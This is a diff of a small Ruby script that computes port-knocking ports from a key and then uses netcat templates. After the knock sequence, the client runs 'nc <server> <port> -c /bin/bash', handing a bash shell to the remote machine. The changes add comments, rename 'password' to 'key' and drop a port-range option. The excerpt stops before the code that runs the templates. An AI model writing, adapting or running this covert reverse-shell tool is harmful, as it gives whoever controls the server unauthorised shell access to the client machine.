@@ -1,10 +1,14 @@
 #!/usr/bin/env ruby
 
+# command for the client to launch
 SHELL = '/bin/bash'
+
+# knocking command
 NC_TEMPLATE = {
   :client => 'nc -z #{server} #{port}',
   :server => 'nc -z -l -p#{port}'
 }
+# shell-exec'ing command
 NC_LAST = {
   :client => 'nc #{server} #{port} -c' + SHELL,
   :server => 'nc -l -p#{port}'
@@ -13,19 +17,15 @@ NC_LAST = {
 low_port, high_port = 1024, 65535
 
 if ARGV.length < 2
-  puts "usage: #{$0} [--range xxxx-yyyy] password server"
+  puts "usage: #{$0} key server"
   exit 1
 end
 
-if ARGV[0] == '--range' && ARGV.shift
-  low_port, high_port = ARGV.shift.split('-').collect { |s| s.to_i }
-end
+key, server = ARGV.shift, ARGV.shift
 
-password, server = ARGV.shift, ARGV.shift
-
-srand password.split('').inject(0) { |sum, n| sum + n[0] }
-ports = (0...password.length).collect do |i|
-  (rand(65536) + password[i]) % (high_port - low_port + 1) + low_port
+srand key.split('').inject(0) { |sum, n| sum + n[0] }
+ports = (0...key.length).collect do |i|
+  (rand(65536) + key[i]) % (high_port - low_port + 1) + low_port
 end
 
 [:client, :server].each do |machine|
